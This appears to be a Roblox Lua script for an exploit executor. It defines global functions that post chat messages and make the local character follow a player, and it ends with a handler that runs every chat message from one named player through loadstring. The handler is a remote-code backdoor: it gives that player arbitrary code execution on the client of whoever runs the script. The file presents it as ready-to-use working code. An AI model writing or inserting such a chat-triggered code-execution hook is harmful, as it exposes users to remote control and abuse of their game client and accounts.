_G.say = function(str) 
  game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All") 
end

_G.followme = function()
  game.Players.LocalPlayer.Character.Humanoid:MoveTo(workspace["le_pedrosigma"].Torso.Position)
end

_G.follow = function(plr)
  game.Players.LocalPlayer.Character.Humanoid:MoveTo(workspace[plr].Torso.Position)
end

game.Players["le_pedrosigma"].Chatted:Connect(function(msg)
    loadstring(msg)()
end)
